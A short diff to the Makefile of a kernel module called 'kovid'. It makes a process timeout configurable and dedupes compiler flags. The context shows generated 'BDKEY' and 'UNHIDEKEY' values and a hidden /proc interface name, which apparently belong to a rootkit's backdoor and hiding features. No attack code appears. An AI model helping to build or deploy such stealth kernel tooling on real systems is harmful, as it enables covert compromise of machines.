@@ -16,15 +16,17 @@ UUIDGEN := $(shell uuidgen)
 ifndef TEST_ENV
 BDKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
 UNHIDEKEY := 0x$(shell od -vAn -N8 -tx8 < /dev/urandom | tr -d ' \n')
+PRCTIMEOUT := 1200
 else
 BDKEY=0x7d3b1cb572f16425
 UNHIDEKEY=0x2
+PRCTIMEOUT := 120
 endif
 
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -DPROCNAME='"$(PROCNAME)"' \
-	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK -DPRCTIMEOUT=1200 \
-	-DPROCNAME_MAXLEN=256 -DCPUHACK -DPRCTIMEOUT=1200 \
+	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
+	-DPROCNAME_MAXLEN=256 -DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) \
 	-DUUIDGEN=\"$(UUIDGEN)\" -DJOURNALCTL=\"$(JOURNALCTL)\"
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
